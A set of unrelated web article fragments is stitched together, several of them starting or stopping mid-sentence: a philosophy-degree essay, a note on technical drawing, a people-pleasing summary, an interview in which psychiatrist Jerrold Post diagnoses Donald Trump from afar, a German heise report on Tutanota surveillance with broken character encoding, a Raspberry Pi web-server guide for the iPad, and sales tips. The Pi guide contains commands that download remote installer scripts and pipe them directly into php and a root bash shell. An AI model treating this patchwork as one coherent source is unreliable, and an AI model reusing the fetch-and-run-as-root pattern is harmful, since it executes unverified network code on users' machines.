Let me give an example. I recently came <a href="https://www.sheffield.ac.uk/polopoly_fs/1.71449%21/file/atkin.pdf">across the case</a> of a group of youngsters who were tried and sentenced in Kansas after a video tape of them torturing and burning a dog surfaced in the public.
</p>
<p>
Now, also note that many prominent criminal psychologists have long recognized cruelty to animals as a precursor to violence against humans. In other words, the likelihood of someone committing a crime against humans is considered to be higher if theyâ€™ve in the past committed animal cruelty. 
</p>
<p>
So letâ€™s go back to this case. It seems fairly obvious that the judge is going to sentence these youngsters to some time in prison. But wait a second - is he also going to take into account the fact that they are <em>now potentially more likely</em> to commit a crime against humans in the future? Or is he just going to sentence them for what they did?
</p>
<p>
The distinction here is crucial. If the judge solely sentences the youngsters for what they did to the dog, then we can say that the judge is taking a <em>retributivist view</em>. By this, we mean that the judge is issuing a penalty that is in direct proportion to the magnitude of the crime committed.
</p>
<p>
But if the judge does decide to lengthen their sentence because he believes that there is a potential future risk of them hurting other humans, then he is taking a <em>consequentialist </em>view. Here, the judge is <em>also</em> punishing for a crime that has not yet been committed (but could potentially be) for the sake of securing a greater social good. 
</p>


  <center>
    <img src="https://www.careerfair.io/assets_philobenefits/retributivism.png" alt="">
  </center>

<p>
So the rather vague conclusion of â€œYoungsters sentenced to prison for hurting a dogâ€� can actually be made much more specific by examining the two theories of retributivism and consequentialism. 
</p>
<p>
A philosopherâ€™s job is to make both sides of the argument crystal clear. And when thereâ€™s room for ambiguity (which is most of the time), his/her job is to fill in the gaps.
</p>
<p>
A practical application of the above in my day to day is when I need to understand what a client really wants. Theyâ€™ll often be extremely vague about their requests and it is my job to capture the more important bits of information and then transfer that knowledge to my team. 
</p>
<p>
Now, I obviously donâ€™t have to deal with moral issues like the animal cruelty case above, but the exercise of critically evaluating the different pieces to an argument has come in very useful. 
</p>
<h2>Ability to craft a strong argument</h2>


<p>
An argument is a group of statements including one or more premises and one and only one conclusion (<a href="https://www.uky.edu/~rosdatte/phi120/lesson1a.htm#:~:text=A%20premise%20is%20a%20statement,premises%20in%20a%20single%20argument.&amp;text=The%20foolproof%20way%20to%20do,this%20question%20is%20the%20conclusion.">source</a>).
</p>
<p>
If you can identify a false premise, you can invalidate an argument. 
</p>
<p>
One of the ways in which I learnt how to do this is by argument mapping. <a href="http://shamik.net/">One of my professors</a> introduced us to a tool called <a href="https://www.rationaleonline.com/">Rationale</a> that makes it really easy to do this. For example, hereâ€™s what an argument map for intelligent design might look like:
</p>

  <center>
    <img src="https://www.careerfair.io/assets_philobenefits/argument_map.png" alt="">
  </center>

<p>
An argument map makes it very easy to follow an argument. My professor would always encourage us to create an argument map before we actually started writing our papers because it would make the writing process much simpler. 
</p>
<p>
Instead of just stating why I think an argument is flawed, an argument map made it easy for me to point to exactly which premise I disagreed with and to present an objection (as can be seen with the red colored boxes). 
</p>
<p>
Argument maps also make it easy to answer the question: â€œHow does this sentence fit into the larger structure?â€� By visualizing statements that are used to support one another, I am able to understand their necessity. 
</p>
<p>
Finally, argument mapping also helps with anticipating potential objections to my argument. Even though I could find my overall argument to be convincing, there would be certain premises that could be better worded. 
</p>
<p>
The above is all very useful in my day to day. Iâ€™m able to comprehend, synthesize, and communicate information in a persuasive manner.. Whether it be in gathering approval from my team members to pursue a certain solution or crafting an email to a client to increase revenue, my ability to craft strong arguments comes in handy everyday. 
</p>
<h2>Ending thoughts</h2>


<p>
There are certainly ways to get the above benefits <em>without</em> having studied philosophy. But I hope that my account has convinced you that philosophy, even when not pursued further in academia, can yield surprisingly practical benefits to whatever career you choose to pursue. 
</p>
<p>
The ability to communicate well and to form clear arguments is useful in just about every field. 
</p>
<p>
If youâ€™re a philosophy major, you'll likely have to spend quite a bit of time outside the classroom picking up industry specific skills. But rather than playing â€œcatch-upâ€�, the combination of these newly acquired skills and the solid base that your philosophy degree has provided you with will make you even more valuable in the long-run.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For longer, I missed something in my communication, something between writing and talking. There's a whiteboard, that's not an option for me since I work remotely. Then there are online diagramming tools, but they felt cumbersome to use: it took me long to draw &amp; I often couldn't find the shape I was looking for.</p>
<p><img src="https://www.marcel.is/img/drawing-writing-talking.png" alt="drawing-writing-talking"></p>
<p>Two years ago, I stumbled upon Doug's <a href="https://www.verbaltovisual.com/our-courses/">course on sketch noting</a>. I learned the basics of technical drawings, but it didn't occur to me I could use drawings for software-related concepts. Then a few weeks ago, I stumbled upon <a href="https://jvns.ca/">Julia's blog</a> and her technical drawings. It turns out she wrote <a href="https://jvns.ca/#on-writing-comics---zines">a bunch of articles</a> where she explains her drawing process. Inspired, I read them all. And then, the final drop: <a href="https://m.signalvnoise.com/how-i-wrote-shape-up/">Ryan's article on how he wrote ShapeUp</a>. I was hooked &amp; determined to give drawings a try.</p>
<p>So I bought a used iPad 7 and an Apple Pencil 1st generation. I installed Notability: a simple note-taking app that both Julia and Ryan used in their beginnings. And I started experimenting.</p>
<p>A few days ago we finished a large refactoring project. I thought that would be a good time to experiment. So I decided to use drawings to explain the thinking process behind the big refactoring we did. Here are a few drawings from the talk:</p>
<p><img src="https://www.marcel.is/img/writing-first-steps-example.png" alt="writing-first-steps-example"></p>
<p>I didn't know what to expect. I was surprised to find out that my coworkers enjoyed the talk &amp; they were quick to understand the driving principles behind the project. So it seems the drawings worked well. I also noticed I liked the process of making the talk: I could express myself better &amp; it was fun.</p>
<p>It's hard to image now going back to the world without the drawings. Something clicked. I think I'm going to experiment with them more.</p></div></div>]]>

									<p><span>“Being someone who pleases people sounds, on the face of it, like a very good idea. But it is a pattern of behavior riddled with problems, as much for the perpetrator as for their audience…” — TSOL</span></p>
<p><span>This may sound brutal, but people-pleasers can be considered…liars. However, the lying isn’t to gain some kind of advantage, but more so the fear of displeasing others.&nbsp;</span></p>
<p><span>“They act like the perfect lover when their real feelings are far darker; they give their assent to plans they hate; and they confuse everyone around them by failing to express, in due time, with the requisite courage, their authentic needs and ambitions.” — TSOL</span></p>
<p><span>A people-pleaser is someone who at times can be themselves, but oftentimes feel they have no option but to mold themselves to the expectations of others.&nbsp;</span></p>
<p><span>The School of Life gives three ideas on how to not fall victim to being a people pleaser:</span></p>
<ol>
<li><span>Remind yourself that your colleagues, partners, and friends are very different from the people you shaped yourself towards in childhood. Most people can be fine with disagreements, receiving bad news, or an occasional rejection. If not, maybe cut those people out of your life?</span></li>
<li><span>“Acknowledge the inadvertently harmful side-effects of our behavior. We may genuinely have good intentions, but we are endangering everyone by not speaking more frankly.” — TSOL</span></li>
<li><span>It’s 100% up to you to be firm and authentic with your views and opinions (while still being respectful. The School of Life adds, “acquire the confidence to be artful about the difficult messages we have to impart.”</span></li>

								<p><b><i>My two cents</i></b><span>: This is a very interesting piece if you identify as a people-pleaser. Even if you don’t, this digital vitamin can give you a small 1mg boost of empathy for those that suffer from people-pleasing syndrome (not a real syndrome). It’s so fascinating how people pleasers became people-pleasers in childhood (for the most part) and how ultimately, it either manifested more in adulthood or tapered off. </span></p>

He was 86 years old.&nbsp;</p><p>In January, just&nbsp; before the start of the pandemic, Post participated in one of his final interviews with Jonathan Winer and me for our podcast, <a href="https://unconventionalthreat.com/">Unconventional Threat</a>.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2ff3c9b3-4098-4412-b06b-1824dbe2c905_1280x720.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F2ff3c9b3-4098-4412-b06b-1824dbe2c905_1280x720.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/2ff3c9b3-4098-4412-b06b-1824dbe2c905_1280x720.jpeg&quot;,&quot;height&quot;:720,&quot;width&quot;:1280,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:146382,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>By that time, his concerns about President Donald Trump had led him to break with the strictures other colleagues felt to produce and publish a profile equivalent to others he had done for the CIA. Post had created the Center for the Analysis of Personality and Political Behavior at the CIA. Over time, he had profiled Menachem Begin and Anwar Sadat for President Jimmy Carter prior to the Camp David Accords. He also produced profiles of&nbsp; Kim Jong-Il, Osama bin Laden, and Saddam Hussein, among others.</p><p>He now decided to apply the same techniques he had used on world leaders and others to analyze the President of the United States. In so doing, he was breaking a longstanding guideline established by the American Psychiatric Association, known as the Goldwater rule, in which professionals do not diagnose public figures who they have not personally examined and assessed. However, in a long-ranging interview, Post said that Donald Trump represented a clear and present danger to the United States. He said that Trump’s actions in plain sight and his well-known biography made it possible to describe the dangers in psychiatric terms. And he felt compelled to discuss his findings.</p><p>One of Post’s fellow psychiatrists, Dr. Bandy Lee of Yale University, also spoke to us for the podcast. Specializing in violence prevention and prison reform, Lee edited a book, <a href="https://us.macmillan.com/books/9781250212863">The Dangerous Case of Donald Trump</a>, essays by 37 psychiatrists and mental health specialists about Trump. Lee said that Post offered his prominence to highlight analysis of the Trump presidency and Trump’s mental state, despite the strictures placed on psychiatrists by the Goldwater rule. Post contributed an essay to that volume, before writing his own book, <a href="https://www.simonandschuster.com/books/Dangerous-Charisma/Jerrold-Post/9781643132181">Dangerous Charisma: The Political Psychology of Donald Trump and His Followers.</a></p><p>Lee praised Post’s decision to go public and said that his support and prominence in the field helped guide her role.&nbsp;</p><p>&nbsp;“He, too, was very disturbed about the president's dangerous psychology,” she said. Post’s “generous concern moved me since, in this country, while the CIA may have done profiles regularly for decades, the same is not permitted for the public (the American Psychiatric Association also made clear with the Trump administration that our own leaders are off-limits, no matter the dangers they pose).”</p><p>In our interview, Post said he applied the profiling categories he had pioneered over time not only to describe Donald Trump as a dangerous personality. Among other things he said he had fears for the 2020 elections: If Trump won by a small margin, he would once again declare a landslide. But if he lost, he would never accept the outcome.&nbsp;</p><p>Here are condensed, edited excerpts from our talk:</p><p><em>Q: In your book, "Dangerous Charisma," you describe Donald Trump as a malignant narcissist.</em></p><p>Post: He's almost a caricature of the narcissistic personality, in particular, malignant narcissism. He's consumed with self-adoration. Certainly he is, without any shred of empathy for others. Consider the way he dealt with John McCain, mocking him as he was on his deathbed with malignant brain cancer. Or consider him mocking the reporter who had a congenital disability, which gave him a tremor. Recall his remarkably unempathetic response to the Pakistani American who was a Gold Star father, having lost his heroic son in Afghanistan. In each of these cases he, in a rather cruel way, mocked these individuals.</p><p>This is an extremely unattractive characteristic, but he also led his followers to mount their feelings in opposition to these individuals. So that's one striking quality. He's very sensitive to slight, which is one of the characteristics of the narcissist. And he can then retaliate angrily for a minor offense. So that this is one of the makings of a sycophantic leadership, because to criticize constructively [will] lead to his angry response.</p><p><em>Q: How dangerous is this behavior?&nbsp;</em></p><p>Post: Well this is unique. If you have a young person who is damaged in some way and starts exhibiting these characteristics, they may not go any place other than to exhibit these characteristics in private, and just go off into a medium level life. But then you might have somebody who has a father who is a multimillionaire and you're able to start seeing that the whims of this type of personality are able to be answered because of the wealth that surrounds the personality. And then as things grow and grow with more and more accumulation, more and more ability to fulfill the whims of this personality.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F33b561d9-cdfb-4ef6-8a55-f5ffd61d73b5_1200x937.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F33b561d9-cdfb-4ef6-8a55-f5ffd61d73b5_1200x937.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/33b561d9-cdfb-4ef6-8a55-f5ffd61d73b5_1200x937.jpeg&quot;,&quot;height&quot;:937,&quot;width&quot;:1200,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:173265,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p><em>Q: But this is now more than a wealthy person, this is the ultimate extreme, isn’t it?</em></p><blockquote><p>Post: One of the things that concerns me has to do with his decision-making under stress. </p></blockquote><p>That is when he is most apt to give voice to extreme positions and that is very worrisome. The assassination of Soleimani [Quds commander Qasem Soleimani by U.S. forces in Iran last January] is perhaps a good example. [Trump] was looking for an array of possible options to choose...And he chose the most extreme position on that list, which was the assassination of Soleimani, who was a very revered figure in Iran. This was an extremely over-reactive policy and one which it stopped only after the Iranians decided after their careful attacks on our air bases in Iraq that it would stop. But it greatly weakened our policy. And we were within an inch of what would have been a dreadful situation. This is not the first time this has happened. We've seen the possibility of conflict suddenly emerge with North Korea and on trade with China and then disappear.&nbsp;</p><p><em>Q: What is it about his personality that seems to thrive on creating a crisis and then having it go away? And that is a pattern, is it not?</em></p><p>Post: It is indeed. He had as a mentor, Roy Cohn, who was the right hand man to Senator [Joseph] McCarthy. One of the maxims Trump adapted from him…is when someone slaps you, hit him back 10 times harder. Well, that's an interesting prescription. So this is defensive aggression, which can then drive a situation out of control.</p><p><em>Q: Is there an element of cowardice in behavior like this at the same time? Is it possible that somebody lashes out actually because of feeling frightened and inadequate and they kind of lash out as a result?</em></p><p>Post: It's really important to think of Trump in layers. The outside layer is one of grandiosity. And what's underneath that? Think of an onion, hollow in the center. This is a very difficult personality. He's learned a number of maxims, which he regularly details in his book, <a href="https://www.penguinrandomhouse.ca/books/180675/trump-the-art-of-the-deal-by-donald-j-trump-with-tony-schwartz/9780399594496/excerpt">The Art of the Deal.</a> His books give a very vivid portrait of someone who has a very powerful exterior, which, inferentially we can conclude, has a great deal of insecurity underneath them.</p><p><em>Q: Well, he seems every time to escape scrutiny, and to be able to accomplish more. Are there any limits?</em></p><p>Post: The limits of his ambition are boundless. Let me give one example. I've been struck by the desire to build a secure border wall [on the Mexican border]. He has been obsessing about this and in a remarkable fashion. And I think indeed he wants this to be the Great Wall of Trump…I think that this transcends just the security question and has meant to cement his reputation.</p><p><em>Q: We were talking about Donald Trump's not telling the truth. And by being a malignant narcissist, does your psychological profile suggest might be the reason he lies so much. What is the lying about and why is the lying increasing over time?</em></p><p>Post: Well, the lying is usually about aspects of history and concluding contemporary relations. He is recasting history to put himself in a more favorable place. But I don't know that he after a while sees this as a lie as much as coming to believe his own propaganda. He ends up after saying it enough times that this becomes his truth too.</p><p><em>Q: What are the implications of his lying not only for his followers, but also for the rest of the world?</em></p><blockquote><p>Post: He's being mocked in other parts of the world for his grandiosity and for his not telling the truth. But his followers don't see either of those things.</p><p><em>Q: What do they see? And why?&nbsp;</em></p></blockquote><p>Post: Well, that raises an interesting question. You're talking about his followers homogeneously as if it's one block and there's a spread from the core of totally committed followers. In other words, some people will follow him all the way to the top of the cliff onto the shores below, and others won't.</p><p><em>Q: You’ve written about the elections and how that would play out. And you quoted from Dylan Thomas in that regard.</em></p><p>Post:&nbsp; Yes, “Do Not Go Gentle Into That Good Night.” Drawing on that, I think we can say of Trump, facing the loss of the limelight of the presidency, he will not go gentle into that good night, but full of rage, rage at the passing of the light. As a narcissist, he collects every day newspapers that write about him, and has a pile of magazines with him on the cover. His need for glorification is insatiable, insatiable…insatiable.</p><p data-attrs="{&quot;url&quot;:&quot;https://www.spytalk.co/subscribe?&amp;gift=true&quot;,&quot;text&quot;:&quot;Give a gift subscription&quot;,&quot;class&quot;:null}"><a href="https://www.spytalk.co/subscribe?&amp;gift=true"><span>Give a gift subscription</span></a></p><p><em>Q: So what happens if he sees a threat to the loss of glory?

So what happens in November 2020 if millions of legal voters reject him and if it looks like he's losing, what do you think that happens?</em></p><blockquote><p>Post: If he loses, the period between the election and the inauguration will be a very dangerous period.

      <p>Tutanota gehÃ¶rt zu den wenigen E-Mail-Anbietern, die standardmÃ¤ÃŸig alle eingehenden Mails verschlÃ¼sseln. Ein Urteil des Landgerichts KÃ¶ln zwingt das hannoversche Unternehmen nun jedoch zum Einbau einer Funktion, mit der Ermittler einzelne PostfÃ¤cher Ã¼berwachen und Mails im Klartext lesen kÃ¶nnen.</p>

<p>Tutanota will Beschwerde gegen den Beschluss einlegen, diese hat jedoch keine aufschiebende Wirkung. â€žWir mussten daher bereits mit der Entwicklung der Ãœberwachungsfunktion beginnenâ€œ, erklÃ¤rte eine Sprecherin Mitte November gegenÃ¼ber câ€™t. Sollte die Beschwerde Erfolg haben, werde man die Funktion nicht aktivieren beziehungsweise wieder entfernen.</p>
<h3 id="nav_abweichende__0">Abweichende Rechtssprechung</h3>
<p>Das KÃ¶lner Urteil ist bemerkenswert, weil es von der Rechtsprechung anderer Gerichte abweicht. So hatte im Sommer <a href="https://www.heise.de/news/Mailanbieter-Tutanota-Staatsanwaltschaft-wollte-Chef-in-Beugehaft-nehmen-4908806.html">das Landgericht Hannover entschieden</a>, dass Tutanota im rechtlichen Sinn keine â€žTelekommunikationsdiensteâ€œ erbringt oder daran mitwirkt â€“ und deshalb auch nicht zur TelekommunikationsÃ¼berwachung verpflichtet werden kann. Die hannoverschen Richter verwiesen wiederum auf ein Grundsatzurteil des EuropÃ¤ischen Gerichtshof (EuGH) von 2019. Diesem zufolge sind E-Mail-Dienste keine Kommunikationsdienste.</p>

  <a-script name="132" needs-consent="" src="https://a.teads.tv/page/87298/tag"></a-script>
  


<p>Das KÃ¶lner Gericht sieht Tutanota dennoch als â€žMitwirkendenâ€œ bei der Erbringung von Telekommunikationsdiensten. Folglich mÃ¼sse das Unternehmen die Ãœberwachung ermÃ¶glichen. Das Urteil, das câ€™t vorliegt, nennt allerdings weder den Namen noch den Betreiber des Telekommunikationsdienstes, an dem Tutanota angeblich mitwirkt. Aus Sicht des Unternehmens ist das Urteil deshalb â€žabsurdâ€œ.</p>
<h3 id="nav_lka_will__1">LKA will Postfach Ã¼berwachen</h3>

<p>In dem Fall geht es um eine Erpressungsmail, die von einem Tutanota-Postfach aus an einen Autozulieferer gesendet worden war. Tutanota sieht sich nun gezwungen, bis Jahresende eine Funktion zu programmieren, die es dem Landeskriminalamt Nordrhein-Westfalen ermÃ¶glicht, dieses Postfach zu Ã¼berwachen.</p>

<p>FÃ¼r die anderen Nutzer soll sich dadurch nichts Ã¤ndern, ihre Mails sollen weiter standardmÃ¤ÃŸig verschlÃ¼sselt werden. Gleichwohl sieht Tutanota eine einmalige Umgehung der VerschlÃ¼sselung als Datenschutz- und Sicherheitsrisiko fÃ¼r letztlich alle Kunden an.</p>
<p><strong>[Update, 30.11., 12 Uhr]</strong> Wie Tutanota betonte, betrifft die ÃœberwachungsmaÃŸnahme nur die neu eingehenden unverschlÃ¼sselten E-Mails. Bereits verschlÃ¼sselte Daten sowie Ende-zu-Ende verschlÃ¼sselte E-Mails in Tutanota kann das Unternehmen nicht entschlÃ¼sseln.<strong> [Update]</strong></p>
<p>AuÃŸer Tutanota speichern auch einige andere Anbieter alle eingehenden Mails in verschlÃ¼sselter Form. Bei Protonmail ist das ebenfalls Standard, Posteo und Mailbox.org bieten die VerschlÃ¼sselung als Option an.

        <p>Beware, this is a geeky one 🤓.</p>
<p>Earlier this year, I updated my <a href="https://hicks.design/journal/ipad-pro-as-computer-one-year-on">status on using the iPad as a computer</a>. In that post I highlighted two obstacles: Ergonomics and Web Development. For the first issue, some of the problems were alleviated by (finally) getting proper mouse support, and the wonderful '<a href="https://hicks.design/journal/ipad-pro-magic-keyboard-thoughts">Magic Keyboard</a>'. I had high hopes for external screen support (not just mirroring) at this year's WWDC in June, but it came and went without any news.</p>
<p>As for Web Development, you still can't run a webserver on the iPad, <em>but</em>, you can attach a Rasberry Pi! The <a href="https://www.raspberrypi.org/products/compute-module-4/?variant=raspberry-pi-cm4001000&amp;resellerType=home">latest incarnation of the Pi</a> (#4) uses USB-C for its power source, allowing a single cable to connect the Pi to the iPad and get both data and power supply from it. This works particulary well with the Magic Keyboard, as you can power both devices through its USB-C port (which can do power, but not data), leaving the iPad's free to connect the Pi.</p>
<figure><img alt="Pi 4 in its packaging" src="https://hicks.design/media/pages/journal/ipad-pi/1bfc53f1b9-1607349248/IMG_0063.jpeg"></figure>
<p>Obviously, any 'normal' computer easily run a webserver, but I really enjoy working on the iPad and tinkering, so wanted to see if it was possible. But why use an add-on piece of hardware, instead of SSHing into a remote server? For me the big advantage is file transfer. I can set up a Samba share on the Pi, and have those directories appear in the native Files app on the iPad. I can then edit text files in a code editor app rather than use terminal (VIM, Nano etc) or a browser-based instance of Visual Studio. Other assets like images can also be saved directly to the Pi via the iPadOS save dialog.</p>
<p>The Pi 4 is small and light (and if you could remove the redundant USB and ethernet ports it could be even smaller) and <a href="https://thepihut.com/products/raspberry-pi-4-model-b?variant=20064052740158">can be bought for as little as £34</a> for the 2gb memory option. I decided on the 4gb for a bit more oomph, and a <a href="https://thepihut.com/collections/raspberry-pi-cases/products/flirc-raspberry-pi-4-case">nice aluminium case to protect it</a>. Setting up the SD card on the Mac was super simple with the <a href="https://www.raspberrypi.org/downloads/">Rasberry Pi Imager app</a>.  </p>
<figure><img alt="" src="https://hicks.design/media/pages/journal/ipad-pi/8bdd37821d-1607349248/imager.png"><figcaption>The imager app has just three steps - choose an OS, an SD card and then press write</figcaption></figure>
<p>For the initial setup, you'll need a separate monitor, keyboard and mouse, but once configured you can attach over VNC (using the Screens app) and SSH. VNC is sluggish, but useful for some setting up tasks. You'll mostly want to use the command line to interact with the Pi though, which means using SSH. More on that later.</p>
<figure><img alt="" src="https://hicks.design/media/pages/journal/ipad-pi/379796af97-1607349249/screens.jpg"><figcaption>Raspberry Pi, viewed on the iPad Pro via Screens app</figcaption></figure>
<p>The first part of the process is to setup the Pi so that it can be used as an 'Ethernet Device' on the iPad. This has quite a few steps, but is very well documented over on <a href="https://magpi.raspberrypi.org/articles/connect-raspberry-pi-4-to-ipad-pro-with-a-usb-c-cable">MagPi Magazine's article</a>. A summary of the process is:</p>
<ul>
<li>Setup the Pi as a USB device and give it a fixed IP</li>
<li>Enable SSH</li>
<li>Enable access over VNC</li>
<li>Install Samba and setup a folder to share</li>
</ul>
<figure><img alt="Final assembled Rasberry Pi 4 in its aluminium case, connected to the iPad via USB-C" src="https://hicks.design/media/pages/journal/ipad-pi/a4cbfb82ba-1607349248/1.jpeg"></figure>
<p>These steps were more straightforward than I expected and took me about 30 mins. So far, so good! But here's where the instructions run out, and I still haven't setup the web server. There are a few more installations to do, but now I can access the Pi via SSH to do this. I tried out quite a few SSH apps, but they all suffer from a limitation where the connection will drop if it's in the background for longer than 20 seconds. If, like me, you spend a lot of time googling for shell commands to install things and then switching back to the terminal, you can find your connection has been lost and you have to start again.  </p>
<p>The key here is the <a href="https://hicks.design/journal/[https://blink.sh](https://blink.sh/)">Blink Shell app</a>, which supports Mosh (Mobile Shell), so that connections stay open. To make use of this, you first need to install Mosh on the Pi: </p>
<pre><code>sudo apt-get install mosh</code></pre>
<p>With Blink, the whole screen is devoted to the terminal, which means that opening the app for the first time is a little daunting. No visible UI, just a command line prompt that says 'blink &gt;'. Stick with it though, because there's a lot there, it's just not immediately obvious. For example, you can use your standard keyboard shortcuts to create and navigate between other tabs. I particularly like being able to add a pre-configured host (in this case I called it 'Pi') so that all I have to do is type:</p>
<pre><code>ssh Pi </code></pre>
<p>…and I'm connected! It even supports external displays (although I would never need a terminal <em>that</em> big). </p>

<h2>Setting up the stack</h2>
<p>Now I can install the web stack, and my needs are fairly simple: Apache, PHP, Node and Git. Your needs will be different, but whatever you need to install the first step is always to update the package manager:</p>
<pre><code>sudo apt update</code></pre>
<p>Then I installed Apache, PHP, Git, Maria (MySQL), Composer and Node:</p>
<pre><code>sudo apt install apache2 -y
sudo apt install php libapache2-mod-php -y
sudo apt updatesudo apt install git
sudo apt install mariadb-server mariadb-client -y
curl -sS https://getcomposer.org/installer | php
$ sudo mv composer.phar /usr/local/bin/composer
$ curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -
$ sudo apt install nodejs</code></pre>
<p>I should point out that when it comes to this part I'm a copy-and-paster, and I'm aware that you shouldn't always install things as a root user (<code>sudo</code>), so do get a second opinion before doing any of this.</p>
<h2>Setting up Virtual Hosts</h2>
<p>The final part I needed to get working was virtual hosts, so that I could view different sites on the iPad. I followed the <a href="https://www.stewright.me/2013/08/add-virtual-hosts-and-subdomains-to-your-raspberry-pi-apache2-server/">instructions by Ste Wright</a>.  So far, I've only got it working via different port numbers, not named servers, but that's enough. </p>
<p>One step of this that's worth reiterating is that after adding a new host, you'll need to enable it, which creates a link from /sites-available/ to /sites-enabled/. This can only be done via command-line (copying the file won't work). In my case, I called the conf file 'vhosts' so to enable the virtual host I did:</p>
<pre><code>a2ensite vhosts</code></pre>
<p>Don't forget to restart apache after you've done:</p>
<pre><code>systemctl reload apache</code></pre>
<p>And finally… I can run a server and view it in Safari!  Finally, when I'm finished, I can shut down the Pi with:</p>
<pre><code>sudo shutdown -h now</code></pre>
<p>Or turn it off using the Raspbian GUI in Screens app.</p>
<h2>Conclusion</h2>
<p>Enough about all the technical setup, does it work? Why, yes it does! </p>
<p>I found following the instructions for initial setup were straightforward. The hardest part of the setup (for me) was the webserver part, running into issues with permissions and dependencies. An experienced developer won't have these issues, but I got so much further than I expected.</p>
<h2>Pros</h2>
<ul>
<li>It's small, inexpensive, light and it actually <em>works</em>. </li>
</ul>
<h2>Cons</h2>
<ul>
<li>First of all, it shouldn't be necessary. </li>
<li>Secondly, I've had some issues with the Pi dropping connection, and being a headless setup makes it hard to know what happened. My guess is that the USB-C cable came out slightly, and the power went off.</li>
<li>Also, running the webserver is only one part of the deal - we still need better inspection tools and the ability to test in different browsers (all iPadOS browsers use the same rendering engine). Using the Screens app, you can use Firefox or Chrome on the Pi for better webdev tools, but this is a slower way to work. </li>
</ul>
<p>The arrival of the M1 Silicon Macs might make this all moot. From all accounts, the speed and snappiness that draws me to the iPad has finally come to MacBooks. It also brings the ability to run iOS and iPadOS apps, so <em>surely</em> touchscreens can't be too far off? For now, this is a good enough setup, maybe not as a full-time solution, but to support my MacBook Pro.</p>

<p>You are in a Sales Conversation with a prospect. The discussion went well and mostly covered features, benefits, and how they relate to the prospect’s use cases. But now what? Should you push for the close?<br>If you’re not sure, it’s best to ask, “What are the best next steps?” But in many situations, you don’t need to ask explicitly because the prospect has already told you they want to move forward.<br>During the conversation, the prospect decided if they want to move forward with the purchase or not.<br>The decision influences the following questions. Instead of asking more product-related questions, they start to give you so-called buying signals. Buying signals are questions that indicate the purchase.</p>



<p>Here are seven of the most common buying signals:</p>



<h2 id="h-can-i-try-the-product">“Can I try the product?”</h2>



<p>Especially in the B2B world, prospects want to give your product a try before purchasing. Get them set up with a trial right after the call. Agree days where you check in with each other to make sure everything works as expected.<br>If you offer services, such as consulting, provide a small Proof of Concept (POC) that allows the prospect to get a better feeling for you and your work. A PoC could be a paid white paper or consulting on a well-scoped sub-project.</p>



<h2 id="h-how-can-i-pay-using-a-credit-card-po-invoice">“How can I pay?” (using a Credit Card, PO Invoice, …)</h2>



<p>Or also “Can I pay via Credit Card?”, “Do you accept Purchase Order and Invoice?”</p>



<p>They are clear to get this done today, and now they want to check out.</p>



<h2 id="h-pricing-details">Pricing details</h2>



<p>“Do I need to sign an annual contract?” “Can I choose a monthly commitment?”</p>



<p>Explain your terms, and ask specific questions if the prospect requests unusual pricing details, such as a monthly contract (when you usually do yearly or multi-year deals).<br>Go over your payment terms.</p>



<h2 id="h-asking-where-do-we-go-from-here">Asking, “Where do we go from here?”</h2>



<p>The prospect decided to move forward and wants to know about the next steps on your side. Do you require a trial? Do you need business information for a quote?<br>Discuss all information you need on your end, as well as their next steps. Do they need to involve other departments such as legal? How can you get a PO Number or get listed as a vendor? Do you need to provide any other necessary paperwork?</p>



<h2 id="h-send-me-a-quote-with-everything-we-discussed">Send me a quote with everything we discussed</h2>



<p>Clear signal to move forward. Summarize all talking points of the discussion and ask for any additional information you might need for the quote, such as an address or contact person.</p>



<h2 id="h-asking-about-additional-services-such-as-extended-support-contracts-or-the-like">Asking about additional services, such as extended support contracts or the like</h2>



<p>The product is a good fit; now the prospect wants to know how well you can take care of them <em>around</em> your actual offering. Ask specific questions to understand their needs here profoundly. Why do they think they need additional support? What are their motives? Services like support contracts are a lucrative additional revenue stream. Even if you don’t offer anything like that by default, ask more questions to understand the prospect’s requirements and develop an extended offer satisfying the prospect’s needs.</p>



<h2 id="h-asked-for-case-studies-reference-customers">Asked for Case Studies, reference customers</h2>



<p>How well could you help other customers in the past? Make sure you have references available you can share. Some of them might require explicit, written approval.<br>Also, try to find people at the customer’s organization who are open to discuss their experience with you with your current prospect.</p>



<p>Now it’s your turn. Go out and listen carefully to these buying signals in your next sales conversations.</p>



<p>Does your business and sales process have different buying signals, and you’d like to get your strategy to the next level? <a href="mailto:jan@work-with-jan.com" rel="nofollow">Get in touch</a> to discuss your requirements and how we can work together.</p>

